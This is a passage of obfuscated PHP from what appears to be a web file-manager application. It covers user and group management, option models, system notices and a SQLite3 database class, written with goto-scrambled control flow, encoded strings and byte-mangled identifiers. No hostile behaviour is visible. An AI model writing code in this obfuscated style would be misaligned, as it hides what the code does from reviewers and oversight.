$this->getInfoSimple($B™¾İÉß—å); if (!$B‚´Õùİ ã || !is_array($f†ÃÂ™¶À)) { return !1; } goto Cí…Ó’­¸; CšĞº™‡§»: } protected function userGroupAdd($díå‚±ó®›, $C——ƒ¬†ˆî = array()) { $eÄ‹ô‰‚À =& $_SERVER[©]; $CŠ—¼ƒµ½ = $this->getInfoSimple($díå‚±ó®›); if (!$CŠ—¼ƒµ½ || empty($C——ƒ¬†ˆî)) { return !1; } $e­œÕ·Å = array(); foreach ($C——ƒ¬†ˆî as $C—ãùáËåÄ => $c²ÆÁÁä) { $e­œÕ·Å[] = array($eÄ‹ô‰‚À[1434] => $díå‚±ó®›, $eÄ‹ô‰‚À[2102] => $C—ãùáËåÄ, $eÄ‹ô‰‚À[2233] => $c²ÆÁÁä); } return Model($eÄ‹ô‰‚À[2178])->addAll($e­œÕ·Å, array(), !0); } protected function userGroupRemove($A™Ï‘›†÷İ, $F½ä’µ…¼) { $CºŞ™‡Ÿİõ =& $_SERVER[©]; $fÃÈ¿¯éñ = $this->getInfoSimple($A™Ï‘›†÷İ); if (!$fÃÈ¿¯éñ || !$F½ä’µ…¼) { return !1; } $fÑŒÔ‹Êí = array($CºŞ™‡Ÿİõ[1425] => $A™Ï‘›†÷İ, $CºŞ™‡Ÿİõ[2176] => $F½ä’µ…¼); return Model($CºŞ™‡Ÿİõ[2178])->where($fÑŒÔ‹Êí)->delete(); } public function listData() { $A—°Õõ¾ó = $this->_makeOrder()->selectPage(50); $this->_listDataApply($A—°Õõ¾ó[$_SERVER[©][363]]); return $A—°Õõ¾ó; } public function listByID($b¸¿‚¬™ïö) { $aÊ–øÃìğ„ =& $_SERVER[©]; if (!$b¸¿‚¬™ïö) { return; } $D‰½åó“é = array($aÊ–øÃìğ„[1434] => array($aÊ–øÃìğ„[17], $b¸¿‚¬™ïö)); $d¿ŸİÖ’œÃ = $this->where($D‰½åó“é)->select(); $this->_listDataApply($d¿ŸİÖ’œÃ); return $d¿ŸİÖ’œÃ; } public function listByGroup($DÍºù¯™ß¼ = 0, $d İ¶Õ¬Ğˆ = array()) { goto Eˆˆö‡Ú«; Eˆˆö‡Ú«: $DÊíœ¬Èñ¶ =& $_SERVER[©]; $b˜¢…Àæ…× = $DÊíœ¬Èñ¶[43]; $dÇÂöª÷÷ó = array(); goto Cá©’Ü¼”›; fœöç— Äâ: $this->_listDataApply($CÔóØ‰‹Á[$DÊíœ¬Èñ¶[363]]); return $CÔóØ‰‹Á; goto bÃùÈñ–ç—; Cá©’Ü¼”›: if ($DÍºù¯™ß¼) { $dÇÂöª÷÷ó = array($DÊíœ¬Èñ¶[2528] => intval($DÍºù¯™ß¼)); $b˜¢…Àæ…× = "\114\x45\106\124\x20\112\117\x49\x4e\40{$this->tablePrefix}\x75\x73\145\162\137\x67\162\157\x75\160\x20\165\x73\145\162\137\147\162\x6f\x75\x70\x20\157\156\x20\165\163\145\x72\56\x75\163\145\162\111\x44\40\x3d\40\165\x73\x65\162\x5f\x67\162\157\x75\x70\x2e\165\163\x65\x72\x49\x44"; $f‡ƒ‰Â¦ˆ§ = Input::get($DÊíœ¬Èñ¶[415], null, $DÊíœ¬Èñ¶[43]) ? $DÊíœ¬Èñ¶[43] : $DÊíœ¬Èñ¶[2529]; } if (isset($d İ¶Õ¬Ğˆ[$DÊíœ¬Èñ¶[688]])) { $dÇÂöª÷÷ó[$DÊíœ¬Èñ¶[2530]] = $d İ¶Õ¬Ğˆ[$DÊíœ¬Èñ¶[688]]; } $CÔóØ‰‹Á = $this->_makeOrder($f‡ƒ‰Â¦ˆ§)->field($DÊíœ¬Èñ¶[2531])->where($dÇÂöª÷÷ó)->join($b˜¢…Àæ…×)->selectPage(50); goto fœöç— Äâ; bÃùÈñ–ç—: } private function _makeOrder($C¸“·Íâ™ = '') { goto b–¤ñ³Ö“É; b–¤ñ³Ö“É: $D’‹“²ŠÛ­ =& $_SERVER[©]; $a·²Çøï“Ğ = array($D’‹“²ŠÛ­[1434], $D’‹“²ŠÛ­[38], $D’‹“²ŠÛ­[2088], $D’‹“²ŠÛ­[2060], $D’‹“²ŠÛ­[197]); $a²‹°õ²«‹ = array($D’‹“²ŠÛ­[410] => $D’‹“²ŠÛ­[411], $D’‹“²ŠÛ­[412] => $D’‹“²ŠÛ­[413]); goto E…ùùóŠ£™; a§ØËÊåä«: $C¸“·Íâ™ = $C¸“·Íâ™ . "\165\x73\145\162\56{$bÈğğô„œ}\40{$CÒÍºë´Á¥}\54\40\x75\163\x65\x72\56\165\163\145\x72\x49\104\x20\x61\163\143"; return $this->alias($D’‹“²ŠÛ­[2277])->order($C¸“·Íâ™); goto B‡ƒ£‘ë›; E…ùùóŠ£™: $bÈğğô„œ = Input::get($D’‹“²ŠÛ­[415], $D’‹“²ŠÛ­[17], $D’‹“²ŠÛ­[1425], $a·²Çøï“Ğ); $CÒÍºë´Á¥ = Input::get($D’‹“²ŠÛ­[416], $D’‹“²ŠÛ­[17], $D’‹“²ŠÛ­[2179], array($D’‹“²ŠÛ­[2179], $D’‹“²ŠÛ­[412])); $CÒÍºë´Á¥ = $a²‹°õ²«‹[$CÒÍºë´Á¥]; goto a§ØËÊåä«; B‡ƒ£‘ë›: } public function listSearch($eŸ‘ß¬ÖÑ–) { goto F‘Õ‰; D©¢àÌ‡»ò: $Fõ‹œ¬®íÃ = str_replace($a–İ†‘ƒ‡¼[2182], $a–İ†‘ƒ‡¼[2183], trim($Fõ‹œ¬®íÃ)); $AÇÄ²‹®Ïá = array($a–İ†‘ƒ‡¼[38] => array($a–İ†‘ƒ‡¼[751], "\x25{$Fõ‹œ¬®íÃ}\45"), $a–İ†‘ƒ‡¼[302] => array($a–İ†‘ƒ‡¼[751], "\x25{$Fõ‹œ¬®íÃ}\x25"), $a–İ†‘ƒ‡¼[2334] => array($a–İ†‘ƒ‡¼[751], "\45{$Fõ‹œ¬®íÃ}\45"), $a–İ†‘ƒ‡¼[911] => $a–İ†‘ƒ‡¼[2184]); if (Input::check($Fõ‹œ¬®íÃ, $a–İ†‘ƒ‡¼[308])) { $AÇÄ²‹®Ïá[$a–İ†‘ƒ‡¼[1434]] = array($a–İ†‘ƒ‡¼[751], "\x25{$Fõ‹œ¬®íÃ}\x25"); $AÇÄ²‹®Ïá[$a–İ†‘ƒ‡¼[2512]] = array($a–İ†‘ƒ‡¼[751], "\45{$Fõ‹œ¬®íÃ}\45"); } goto aÊíÔùÁ©œ; F‘Õ‰: $a–İ†‘ƒ‡¼ =& $_SERVER[©]; $Fõ‹œ¬®íÃ = $eŸ‘ß¬ÖÑ–[$a–İ†‘ƒ‡¼[2180]]; $e¶¯ªéÑ„Œ = isset($eŸ‘ß¬ÖÑ–[$a–İ†‘ƒ‡¼[2181]]) ? $eŸ‘ß¬ÖÑ–[$a–İ†‘ƒ‡¼[2181]] : !1; goto D©¢àÌ‡»ò; A¥•Œ…Ù¶ø: return $BìÇåÁ´«Œ; goto bˆ¦ÖŠ’œÙ; f·¡Ñõ„È²: if (!$BìÇåÁ´«Œ || count($BìÇåÁ´«Œ[$a–İ†‘ƒ‡¼[363]]) < 5 && Input::check($Fõ‹œ¬®íÃ, $a–İ†‘ƒ‡¼[315])) { $aî…µê°ÛÄ = $this->_searchFromMeta($a–İ†‘ƒ‡¼[423], $Fõ‹œ¬®íÃ, 10); $F¨„–‚„¹† = $this->_searchFromMeta($a–İ†‘ƒ‡¼[424], $Fõ‹œ¬®íÃ, 10); $d¤ì•½Ò§– = array_merge($aî…µê°ÛÄ, $F¨„–‚„¹†, $BìÇåÁ´«Œ[$a–İ†‘ƒ‡¼[363]]); $BìÇåÁ´«Œ[$a–İ†‘ƒ‡¼[363]] = array_unique_by_key($d¤ì•½Ò§–, $a–İ†‘ƒ‡¼[1434]); $BìÇåÁ´«Œ[$a–İ†‘ƒ‡¼[360]][$a–İ†‘ƒ‡¼[361]] = count($BìÇåÁ´«Œ[$a–İ†‘ƒ‡¼[363]]); $BìÇåÁ´«Œ[$a–İ†‘ƒ‡¼[360]][$a–İ†‘ƒ‡¼[362]] = ceil($BìÇåÁ´«Œ[$a–İ†‘ƒ‡¼[360]][$a–İ†‘ƒ‡¼[361]] / $BìÇåÁ´«Œ[$a–İ†‘ƒ‡¼[360]][$a–İ†‘ƒ‡¼[358]]); } $this->_listDataApply($BìÇåÁ´«Œ[$a–İ†‘ƒ‡¼[363]]); $this->_filterByGroup($BìÇåÁ´«Œ, $e¶¯ªéÑ„Œ); goto A¥•Œ…Ù¶ø; aÊíÔùÁ©œ: if (!$Fõ‹œ¬®íÃ) { $AÇÄ²‹®Ïá = array(); } if (isset($eŸ‘ß¬ÖÑ–[$a–İ†‘ƒ‡¼[688]])) { $AÇÄ²‹®Ïá[$a–İ†‘ƒ‡¼[688]] = $eŸ‘ß¬ÖÑ–[$a–İ†‘ƒ‡¼[688]]; } $BìÇåÁ´«Œ = $this->_makeOrder()->where($AÇÄ²‹®Ïá)->selectPage(20); goto f·¡Ñõ„È²; bˆ¦ÖŠ’œÙ: } private function _filterByGroup(&$Bç×³½øšÁ, $DÈæÙ°Ìµö) { $E™åòÛ¶ … =& $_SERVER[©]; if (!$DÈæÙ°Ìµö) { return $Bç×³½øšÁ; } foreach ($Bç×³½øšÁ[$E™åòÛ¶ …[363]] as $aç ’·Õƒœ => &$dÁå„°èˆå) { $F•¦àìØ = array_to_keyvalue($dÁå„°èˆå[$E™åòÛ¶ …[2532]], $E™åòÛ¶ …[43], $E™åòÛ¶ …[2102]); if (!in_array($DÈæÙ°Ìµö, $F•¦àìØ)) { unset($Bç×³½øšÁ[$E™åòÛ¶ …[363]][$aç ’·Õƒœ]); } } $Bç×³½øšÁ[$E™åòÛ¶ …[363]] = array_values($Bç×³½øšÁ[$E™åòÛ¶ …[363]]); $Bç×³½øšÁ[$E™åòÛ¶ …[360]] = array($E™åòÛ¶ …[2310] => count($Bç×³½øšÁ[$E™åòÛ¶ …[363]]), $E™åòÛ¶ …[2308] => $Bç×³½øšÁ[$E™åòÛ¶ …[360]][$E™åòÛ¶ …[358]], $E™åòÛ¶ …[2307] => 1, $E™åòÛ¶ …[2309] => 1); } private function _searchFromMeta($CÁ÷ÀÅ‰Ô, $eŒĞìÚË®Ã, $EïãäĞßªØ) { goto eÕÍ¢³Êö; fŒÂĞÅ©îº: $F¸’ÍÂËË– = Model($F®Äë¢ù¨±[2533])->where($EÍ‡¬á“ùé)->limit($EïãäĞßªØ)->select(); if (!$F¸’ÍÂËË–) { return array(); } $F¸’ÍÂËË– = array_to_keyvalue($F¸’ÍÂËË–, $F®Äë¢ù¨±[43], $F®Äë¢ù¨±[1434]); goto e„¤±óÄª»; eÕÍ¢³Êö: $F®Äë¢ù¨± =& $_SERVER[©]; $eŒĞìÚË®Ã = strtolower($eŒĞìÚË®Ã); $EÍ‡¬á“ùé = array($F®Äë¢ù¨±[99] => $CÁ÷ÀÅ‰Ô, $F®Äë¢ù¨±[368] => array($F®Äë¢ù¨±[751], "\45{$eŒĞìÚË®Ã}\x25")); goto fŒÂĞÅ©îº; e„¤±óÄª»: $eğ›‚ĞŠÚ” = $this->where(array($F®Äë¢ù¨±[1425] => array($F®Äë¢ù¨±[17], $F¸’ÍÂËË–)))->select(); if (!$eğ›‚ĞŠÚ”) { return array(); } return $eğ›‚ĞŠÚ”; goto d Ñ¾óöì; d Ñ¾óöì: } private function _listDataApplyItem($F¢—ˆä¸º) { $cØ™»¼¢°ƒ = array($F¢—ˆä¸º); $this->_listDataApply($cØ™»¼¢°ƒ); return $cØ™»¼¢°ƒ[0]; } private function _listDataApply(&$AÔÊ¸ö¤ê×) { goto E´Å•À—²§; E´Å•À—²§: $båËÊÙ =& $_SERVER[©]; if (!$AÔÊ¸ö¤ê×) { return; } array_remove_key($AÔÊ¸ö¤ê×, $båËÊÙ[799]); goto a¶®­³ä¨¥; Açøî‘¶†ç: $this->_listAppendSourceRoot($AÔÊ¸ö¤ê×, $bÒÛ‹‚Â¡õ); goto B»Ï°³†Æ¶; a¶®­³ä¨¥: $bÒÛ‹‚Â¡õ = array_to_keyvalue($AÔÊ¸ö¤ê×, $båËÊÙ[43], $båËÊÙ[1434]); $this->_listAppendGroup($AÔÊ¸ö¤ê×, $bÒÛ‹‚Â¡õ); $this->_listAppendMeta($AÔÊ¸ö¤ê×, $bÒÛ‹‚Â¡õ); goto Açøî‘¶†ç; B»Ï°³†Æ¶: } private function _listAppendSourceRoot(&$C®Ü£îï˜Ç, $B’‡Ï¾™Á„) { goto aÀçÈ½Ïóï; aÀçÈ½Ïóï: $fŠ£Š§Ûèì =& $_SERVER[©]; $a¾½­¨ò»¯ = array($fŠ£Š§Ûèì[469] => 0, $fŠ£Š§Ûèì[379] => SourceModel::TYPE_USER, $fŠ£Š§Ûèì[464] => array($fŠ£Š§Ûèì[17], $B’‡Ï¾™Á„)); $fŸà£Ì£Ø‚ = $fŠ£Š§Ûèì[2191]; goto a‘Ğ«—êõí; f–ŠÁóÚ½‡: foreach ($C®Ü£îï˜Ç as &$AÏáˆÖ…Óñ) { $AÏáˆÖ…Óñ[$fŠ£Š§Ûèì[399]] = $e¡Ï³¡ğÚ[$AÏáˆÖ…Óñ[$fŠ£Š§Ûèì[1434]]] ? $e¡Ï³¡ğÚ[$AÏáˆÖ…Óñ[$fŠ£Š§Ûèì[1434]]] : array(); } goto b¥¹®˜¬°²; a‘Ğ«—êõí: $e¡Ï³¡ğÚ = Model($fŠ£Š§Ûèì[752])->order($fŠ£Š§Ûèì[2192])->field($fŸà£Ì£Ø‚)->where($a¾½­¨ò»¯)->select(); $e¡Ï³¡ğÚ = array_to_keyvalue($e¡Ï³¡ğÚ, $fŠ£Š§Ûèì[464]); $e¡Ï³¡ğÚ = array_remove_key($e¡Ï³¡ğÚ, $fŠ£Š§Ûèì[464]); goto f–ŠÁóÚ½‡; b¥¹®˜¬°²: } private function _listAppendGroup(&$b­Á¾–¥´Ã, $B‹·³Üœ†) { goto d“µÓé÷é©; CŠ¥´†Áƒ‘: $D¯¿Ê†Šã = array_to_keyvalue($f°Î…”µˆØ, $aÖùÈê‡ºÃ[43], $aÖùÈê‡ºÃ[2102]); $D¯¿Ê†Šã = array_remove_value(array_unique($D¯¿Ê†Šã), $aÖùÈê‡ºÃ[476]); if (!$D¯¿Ê†Šã || !$f°Î…”µˆØ) { return; } goto D¹â–À¯…á; D¹â–À¯…á: $då˜êÆç‹š = array($aÖùÈê‡ºÃ[2102] => array($aÖùÈê‡ºÃ[17], $D¯¿Ê†Šã)); $fƒª‹±©Î× = Model($aÖùÈê‡ºÃ[2534])->field($aÖùÈê‡ºÃ[2535])->where($då˜êÆç‹š)->select(); $A¡Ş¢Èë = array_to_keyvalue($fƒª‹±©Î×, $aÖùÈê‡ºÃ[2102], $aÖùÈê‡ºÃ[38]); goto dšÅÆ—Ì·; d“µÓé÷é©: $aÖùÈê‡ºÃ =& $_SERVER[©]; $då˜êÆç‹š = array($aÖùÈê‡ºÃ[1434] => array($aÖùÈê‡ºÃ[17], $B‹·³Üœ†)); $f°Î…”µˆØ = Model($aÖùÈê‡ºÃ[2178])->where($då˜êÆç‹š)->select(); goto CŠ¥´†Áƒ‘; dšÅÆ—Ì·: $f°Î…”µˆØ = array_to_keyvalue_group($f°Î…”µˆØ, $aÖùÈê‡ºÃ[1434]); foreach ($f°Î…”µˆØ as &$a¨æšÏŒ”ó) { $DÜ»“Â â‹ = array(); foreach ($a¨æšÏŒ”ó as $c°’–‚ñ) { if (!$c°’–‚ñ[$aÖùÈê‡ºÃ[2233]]) { continue; } $aÔø’”Ä…¿ = Model($aÖùÈê‡ºÃ[2252])->listData($c°’–‚ñ[$aÖùÈê‡ºÃ[2233]]); $DÜ»“Â â‹[] = array($aÖùÈê‡ºÃ[2102] => $c°’–‚ñ[$aÖùÈê‡ºÃ[2102]], $aÖùÈê‡ºÃ[2536] => $A¡Ş¢Èë[$c°’–‚ñ[$aÖùÈê‡ºÃ[2102]]], $aÖùÈê‡ºÃ[384] => $aÔø’”Ä…¿); } $a¨æšÏŒ”ó = $DÜ»“Â â‹; } foreach ($b­Á¾–¥´Ã as &$FÆ¡®ªù) { $FÆ¡®ªù[$aÖùÈê‡ºÃ[2532]] = array(); if (isset($f°Î…”µˆØ[$FÆ¡®ªù[$aÖùÈê‡ºÃ[1434]]])) { $FÆ¡®ªù[$aÖùÈê‡ºÃ[2532]] = $f°Î…”µˆØ[$FÆ¡®ªù[$aÖùÈê‡ºÃ[1434]]]; } } goto bÕØ¼¥ï®Ø; bÕØ¼¥ï®Ø: } private function _listAppendMeta(&$f„ê‡–š‰½, $a„à¨Æ†·) { goto cˆØ’š‹Ö‰; CÔ–Ù¶•“‡: $c±Ô”ğ›Í¨ = array($fÖé¥ˆ‹Ç[1434] => array($fÖé¥ˆ‹Ç[17], $a„à¨Æ†·)); $eÔ‹Û…’Ê = Model($fÖé¥ˆ‹Ç[2511])->where($c±Ô”ğ›Í¨)->select(); $eÔ‹Û…’Ê = array_to_keyvalue_group($eÔ‹Û…’Ê, $fÖé¥ˆ‹Ç[1434]); goto F«ÇŒïÌ•ì; cˆØ’š‹Ö‰: $fÖé¥ˆ‹Ç =& $_SERVER[©]; $BëÕÜ²î“İ = UserJobModel::JOB_KEY; $fÁ·çíçµÔ = array($fÖé¥ˆ‹Ç[2514]); goto CÔ–Ù¶•“‡; F«ÇŒïÌ•ì: foreach ($eÔ‹Û…’Ê as &$Aâ£  Ô¥º) { $D¿é”îñ = array(); foreach ($Aâ£  Ô¥º as $DëñË£Üù¹) { if (!in_array($DëñË£Üù¹[$fÖé¥ˆ‹Ç[99]], $fÁ·çíçµÔ)) { $D¿é”îñ[$DëñË£Üù¹[$fÖé¥ˆ‹Ç[99]]] = $DëñË£Üù¹[$fÖé¥ˆ‹Ç[368]]; } } $Aâ£  Ô¥º = $D¿é”îñ; } $DŠôÏã†† = Model($fÖé¥ˆ‹Ç[2537]); foreach ($f„ê‡–š‰½ as &$dÊí©ÜÖâ•) { $dÆÇŒÌŒ¿Í = array(); if (isset($eÔ‹Û…’Ê[$dÊí©ÜÖâ•[$fÖé¥ˆ‹Ç[1434]]])) { $dÆÇŒÌŒ¿Í = $eÔ‹Û…’Ê[$dÊí©ÜÖâ•[$fÖé¥ˆ‹Ç[1434]]]; } $dÊí©ÜÖâ•[$fÖé¥ˆ‹Ç[2538]] = array(); if (isset($dÆÇŒÌŒ¿Í[$BëÕÜ²î“İ])) { $dÊí©ÜÖâ•[$fÖé¥ˆ‹Ç[2538]] = $DŠôÏã††->getUserJobInfo($dÆÇŒÌŒ¿Í[$BëÕÜ²î“İ]); } } goto e™·â‡ŸÊ‚; e™·â‡ŸÊ‚: } protected function groupUserAll($E›¤ÚÙŠŒ) { $aÄã£Î®Œ‘ =& $_SERVER[©]; if (!$E›¤ÚÙŠŒ) { return !1; } $AÏäÃ†ˆšó = Model($aÄã£Î®Œ‘[2178])->field($aÄã£Î®Œ‘[1434])->where(array($aÄã£Î®Œ‘[2102] => array($aÄã£Î®Œ‘[17], $E›¤ÚÙŠŒ)))->select(); $AÏäÃ†ˆšó = array_to_keyvalue($AÏäÃ†ˆšó, $aÄã£Î®Œ‘[43], $aÄã£Î®Œ‘[1434]); return array_unique($AÏäÃ†ˆšó); } public function userSearch($bø¢ò‰¶¯Â, $Eí¶­Š‹ = "\x2a") { return Model($_SERVER[©][485])->where($bø¢ò‰¶¯Â)->field($Eí¶­Š‹)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\162\137\157\x70\164\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($e»ÛÊ ÎŸ) { $FÈ£˜½ØóÜ =& $_SERVER[©]; if (!defined($FÈ£˜½ØóÜ[435])) { define($FÈ£˜½ØóÜ[435], 0); } return "\125\x73\145\162\117\x70\x74\x69\x6f\x6e\x5f{$e»ÛÊ ÎŸ}\x5f" . USER_ID; } protected function filterWhere($AğîÄİöö) { $A¨äŞé =& $_SERVER[©]; if (!defined($A¨äŞé[435])) { define($A¨äŞé[435], 0); } $AğîÄİöö[$A¨äŞé[1434]] = USER_ID; return $AğîÄİöö; } public function cacheRemoveUser($cÖˆÏŒØ‚â, $eÇù¦âµí) { return Cache::remove("\125\163\145\x72\117\x70\164\x69\157\x6e\137{$cÖˆÏŒØ‚â}\137" . $eÇù¦âµí); } protected function optionDefault($b™ã·³¸öœ = '') { $CÇ¦”ÑÇ° =& $_SERVER[©]; if ($b™ã·³¸öœ == $CÇ¦”ÑÇ°[43]) { return $GLOBALS[$CÇ¦”ÑÇ°[16]][$CÇ¦”ÑÇ°[2539]]; } if ($b™ã·³¸öœ == $CÇ¦”ÑÇ°[2540]) { return $GLOBALS[$CÇ¦”ÑÇ°[16]][$CÇ¦”ÑÇ°[2541]]; } } } goto b¡ìÚÖ§Ğ©; CóÃƒ‚ğÅ : define($_SERVER[©][238], 1); define($_SERVER[©][239], 0); define($_SERVER[©][240], 2); goto BÀ‡Œ¸ÍÇ; eö¨Éš‰‡…: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\56\156\157\x74\151\143\145\x4c\x69\163\164"; public $field = array("\x6e\141\155\145", "\x63\157\156\x74\145\x6e\164", "\141\x75\164\150", "\x6d\157\144\145", "\x74\151\x6d\x65", "\164\x79\x70\145", "\x6c\x65\166\145\154", "\145\x6e\141\x62\x6c\x65", "\163\x6f\162\164"); public function listData($Cí½Çº»Å’ = false, $BÃÜêÇ¾« = "\163\157\162\x74", $e¨Áà¹«œÙ = false) { return parent::listData($Cí½Çº»Å’, $BÃÜêÇ¾«, $e¨Áà¹«œÙ); } public function add($Bö«Ú…Œ§¥) { $CùÓ‰®õ =& $_SERVER[©]; $E·¸ì±íƒ = time(); if ($Bö«Ú…Œ§¥[$CùÓ‰®õ[22]] == $CùÓ‰®õ[2474]) { $E·¸ì±íƒ = strtotime($Bö«Ú…Œ§¥[$CùÓ‰®õ[200]]); } $Bö«Ú…Œ§¥[$CùÓ‰®õ[200]] = $E·¸ì±íƒ; return parent::insert($Bö«Ú…Œ§¥); } public function update($eß’óöÇá, $Bã§­¾¼î) { goto c Ó‹””ö«; FÑÈÏô“„Ÿ: return parent::update($eß’óöÇá, $Bã§­¾¼î); goto d…‘™„Š¬¨; c Ó‹””ö«: $dŒöîÖÃŠ =& $_SERVER[©]; $C‘»¢¿‹‚× = $this->listData($eß’óöÇá); if (!$C‘»¢¿‹‚×) { return !1; } goto AéÙ£Ø¥; AéÙ£Ø¥: $eØÀŠ­°ê = time(); if ($Bã§­¾¼î[$dŒöîÖÃŠ[22]] == $dŒöîÖÃŠ[2474]) { $eØÀŠ­°ê = strtotime($Bã§­¾¼î[$dŒöîÖÃŠ[200]]); } $Bã§­¾¼î[$dŒöîÖÃŠ[200]] = $eØÀŠ­°ê; goto FÑÈÏô“„Ÿ; d…‘™„Š¬¨: } public function remove($aÊÆ¦’œÉ) { $AÉ«Àœ–± = $this->listData($aÊÆ¦’œÉ); if (!$AÉ«Àœ–± || $AÉ«Àœ–±[$_SERVER[©][1077]]) { return !1; } return parent::remove($aÊÆ¦’œÉ); } public function sort($E”ŠÒ‹¢Ÿ, $DÕ’ôáæ) { return parent::update($E”ŠÒ‹¢Ÿ, $DÕ’ôáæ); } public function enable($C¢â¢·ÀÂÕ, $dĞ”ßÇ®£·) { return parent::update($C¢â¢·ÀÂÕ, array($_SERVER[©][2475] => $dĞ”ßÇ®£·)); } private function initUserOption() { $b£îÒÎ Ãğ =& $_SERVER[©]; $this->optionType = $b£îÒÎ Ãğ[2476]; $this->modelType = $b£îÒÎ Ãğ[2477]; $this->field = array($b£îÒÎ Ãğ[2478], $b£îÒÎ Ãğ[38], $b£îÒÎ Ãğ[200], $b£îÒÎ Ãğ[39], $b£îÒÎ Ãğ[2479], $b£îÒÎ Ãğ[688], $b£îÒÎ Ãğ[193]); } public function userNoticeGet($f¢¾¾×† Ç = false) { $this->initUserOption(); return parent::listData($f¢¾¾×† Ç, $_SERVER[©][375], !0); } public function userNoticeAdd($A¯ÇÀïµÏÈ) { $FàÕ«¯‡à† =& $_SERVER[©]; $this->initUserOption(); $FÚˆ«º´£í = $this->findByKey($FàÕ«¯‡à†[2478], $A¯ÇÀïµÏÈ[$FàÕ«¯‡à†[375]]); if ($FÚˆ«º´£í) { return !0; } $eÀ‡˜’º¢ = array($FàÕ«¯‡à†[2478] => $A¯ÇÀïµÏÈ[$FàÕ«¯‡à†[375]], $FàÕ«¯‡à†[38] => $A¯ÇÀïµÏÈ[$FàÕ«¯‡à†[38]], $FàÕ«¯‡à†[200] => $A¯ÇÀïµÏÈ[$FàÕ«¯‡à†[200]], $FàÕ«¯‡à†[39] => isset($A¯ÇÀïµÏÈ[$FàÕ«¯‡à†[39]]) ? $A¯ÇÀïµÏÈ[$FàÕ«¯‡à†[39]] : 1, $FàÕ«¯‡à†[2479] => isset($A¯ÇÀïµÏÈ[$FàÕ«¯‡à†[2479]]) ? $A¯ÇÀïµÏÈ[$FàÕ«¯‡à†[2479]] : 0, $FàÕ«¯‡à†[688] => 0, $FàÕ«¯‡à†[193] => 0); return parent::insert($eÀ‡˜’º¢); } public function userNoticeEdit($Bç„î„Â¡Ú, $E¿ï£¡†—š) { $this->initUserOption(); return parent::update($Bç„î„Â¡Ú, $E¿ï£¡†—š); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\x74\x65\x6d\x5f\157\x70\x74\151\x6f\156"; protected $jsonField = array("\155\x65\156\165", "\x72\157\x6c\145", "\162\157\x6c\145\x47\162\x6f\x75\x70", "\162\145\147\151\163\164", "\x65\x6d\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($ašéÑêãÚù) { return "\x53\x79\163\164\145\155\117\160\164\151\157\156\x5f{$ašéÑêãÚù}"; } protected function optionDefault($açíŠƒ—”œ = '') { $A·‡Ö¸ªâ¦ =& $_SERVER[©]; if ($açíŠƒ—”œ == $A·‡Ö¸ªâ¦[43]) { return $GLOBALS[$A·‡Ö¸ªâ¦[16]][$A·‡Ö¸ªâ¦[2480]]; } } } class SystemRecordModel extends ModelBaseLight { } goto e” ‹ÅŞòÈ; fø“•“»†Ä: class DbSqlite3Base extends Db { public function __construct($D«ê¾Ü“ØŠ = '') { $eƒˆ¿¯³š” =& $_SERVER[©]; if (!class_exists($eƒˆ¿¯³š”[61])) { think_exception(think_lang($eƒˆ¿¯³š”[20]) . $eƒˆ¿¯³š”[62]); } if (!empty($D«ê¾Ü“ØŠ)) { if (!isset($D«ê¾Ü“ØŠ[$eƒˆ¿¯³š”[22]])) { $D«ê¾Ü“ØŠ[$eƒˆ¿¯³š”[22]] = 438; } $this->config = $D«ê¾Ü“ØŠ; if (empty($this->config[$eƒˆ¿¯³š”[23]])) { $this->config[$eƒˆ¿¯³š”[23]] = array(); } } } public function connect($DŞæÇƒ¸¿ = '', $bÄµŞ‡Œ‘” = 0) { $bí›ç†˜££ =& $_SERVER[©]; if (!isset($this->linkID[$bÄµŞ‡Œ‘”])) { if (empty($DŞæÇƒ¸¿)) { $DŞæÇƒ¸¿ = $this->config; } $this->linkID[$bÄµŞ‡Œ‘”] = new SQLite3($DŞæÇƒ¸¿[$bí›ç†˜££[27]]); if (!$this->linkID[$bÄµŞ‡Œ‘”]) { think_exception($this->linkID[$bÄµŞ‡Œ‘”]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$bÄµŞ‡Œ‘”]->busyTimeout(30000); if (1 != think_config($bí›ç†˜££[28])) { unset($this->config); } } return $this->linkID[$bÄµŞ‡Œ‘”]; } public function free() { $this->queryID = null; } public function query($A°Œàƒ×Á) { goto D®ëÓÀ©˜Ä; BË—©‘»À: think_status($FÚ…¶Â á[30]); $this->queryID = $this->_linkID->query($A°Œàƒ×Á); $this->debug(); goto A¯ÄÀŸ„º; A¯ÄÀŸ„º: if (!1 === $this->queryID) { $this->error(); return !1; } else { $F¹Š›°„‚Ò = $this->getAll(); $this->numRows = count($F¹Š›°„‚Ò); return $F¹Š›°„‚Ò; } goto c¿³÷˜•Š; D®ëÓÀ©˜Ä: $FÚ…¶Â á =& $_SERVER[©]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto cš·Ä°Šø¥; cš·Ä°Šø¥: $this->queryStr = $A°Œàƒ×Á; if ($this->queryID) { $this->free(); } think_action_status($FÚ…¶Â á[29], 1); goto BË—©‘»À; c¿³÷˜•Š: } public function execute($EÙ‰ùÓ‘Ò•) { goto Fâ…Œ×Ùà©; a¦•¨±Ó²¯: $this->queryStr = $EÙ‰ùÓ‘Ò•; if ($this->queryID) { $this->free(); } think_action_status($bğö¥‰ˆ¸â[31], 1); goto dòŒ¶³œ«´; Fâ…Œ×Ùà©: $bğö¥‰ˆ¸â =& $_SERVER[©]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto a¦•¨±Ó²¯; dòŒ¶³œ«´: think_status($bğö¥‰ˆ¸â[30]); $DêĞ®›ğ = $this->_linkID->exec($EÙ‰ùÓ‘Ò•); $this->debug(); goto fÂ·–º›óô; fÂ·–º›óô: if (!1 === $DêĞ®›ğ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto DóéÆ¿„©‡; DóéÆ¿„©‡: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[©][32]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $AÉø‡Ü³Î = $this->_linkID->query($_SERVER[©][33]); if (!$AÉø‡Ü³Î) { $this->error(); return !1; } $this->transTimes = 0; } return 